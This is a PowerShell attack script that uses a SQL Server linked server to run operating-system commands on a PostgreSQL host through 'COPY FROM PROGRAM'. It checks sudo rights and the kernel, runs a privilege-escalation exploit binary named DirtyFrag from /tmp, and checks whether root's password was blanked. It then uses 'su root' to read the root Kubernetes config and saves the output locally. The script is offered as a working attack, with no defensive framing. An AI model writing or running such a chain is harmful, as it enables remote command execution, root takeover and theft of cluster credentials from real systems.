$q=[char]39; $dq=[char]36+[char]36

# Function to run command on PG145 and return output
function PG145-Exec($cmd) {
    sqlcmd -S localhost -x -h -1 -W -Q "EXEC ($q`TRUNCATE cmd_out$q) AT PG145" 2>&1 | Out-Null
    sqlcmd -S localhost -x -h -1 -W -Q "EXEC ($q`COPY cmd_out FROM PROGRAM $dq$cmd$dq$q) AT PG145" 2>&1 | Out-Null
    $r = sqlcmd -S localhost -x -h -1 -W -Q "SELECT * FROM OPENQUERY(PG145,$q`SELECT line FROM cmd_out$q)" 2>&1
    return ($r | Where-Object {$_ -ne "" -and $_ -ne "NULL" -and $_ -notmatch "rows affected|---"})
}

$out = @()

# Step 1: Check sudo
$out += "=== SUDO CHECK ==="
$r = PG145-Exec "sudo -l 2>&1 | head -5"
$out += $r

# Step 2: Check if DirtyFrag binary exists
$out += "=== DIRTYFRAG CHECK ==="
$r = PG145-Exec "ls -la /tmp/df 2>&1"
$out += $r

# Step 3: Check kernel and capabilities
$out += "=== KERNEL ==="
$r = PG145-Exec "uname -r 2>&1"
$out += $r

# Step 4: Check unprivileged userns  
$out += "=== USERNS ==="
$r = PG145-Exec "cat /proc/sys/kernel/unprivileged_userns_clone 2>/dev/null || echo NA"
$out += $r

# Step 5: Run DirtyFrag with PATH (non-blocking, redirect output)
$out += "=== RUNNING DIRTYFRAG ==="
$r = PG145-Exec "export PATH=/usr/bin:/bin:/usr/sbin:/sbin && echo whoami | timeout 45 /tmp/df > /tmp/df_out2.txt 2>&1; echo EXIT:$?"
$out += $r

# Step 6: Check DirtyFrag output
$out += "=== DIRTYFRAG OUTPUT ==="
$r = PG145-Exec "cat /tmp/df_out2.txt 2>&1 | head -20"
$out += $r

# Step 7: Check /etc/passwd after exploit
$out += "=== PASSWD CHECK ==="
$r = PG145-Exec "head -1 /etc/passwd"
$out += $r

# Step 8: If root has empty password, read kubeconfig via su
$out += "=== TRY SU ROOT ==="
$r = PG145-Exec "export PATH=/usr/bin:/bin:/usr/sbin:/sbin && echo 'cat /root/.kube/config' | su root 2>&1 | head -100"
$out += $r

# Save all output
$outPath = Join-Path "F:\Database" "k8s_result.txt"
$out | Out-File $outPath -Encoding ASCII
Write-Output "SAVED_TO: $outPath"
Write-Output "LINES: $($out.Count)"
